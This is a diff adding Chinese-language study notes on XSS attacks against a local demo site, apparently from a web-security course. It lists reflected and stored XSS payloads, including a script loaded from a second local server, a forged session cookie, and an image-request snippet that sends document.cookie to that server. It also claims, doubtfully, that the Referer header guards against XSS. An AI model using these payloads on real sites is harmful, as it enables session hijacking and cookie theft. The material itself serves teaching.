@@ -6,6 +6,17 @@
 
 #### 2. xss攻击（跨站脚本攻击），利用注入脚本攻击
 
+##### （1）反射型 - url参数直接注入
+①：普通：http://localhost:3000/?from=china      
+②：alert尝试：http://localhost:3000/?from=<script>alert(3)</script>    
+③：获取Cookie：http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>    
+伪造cookie入侵： document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="    
+直接在4000端口的页面输入脚本：var img = new Image(); img.src='http://localhost:4000/img?c='+document.cookie 就能获取cookie    
+
+##### （2）存储型 - 存储到DB后读取时注入（在输入框，例如评论区输入内容）
+评论：<script>alert(1)</script>     
+跨站脚本注入：我来了<script src="http://localhost:4000/hack.js"></script>
+
 这种防范可以利用http请求头里面refer字段
 
 未完。
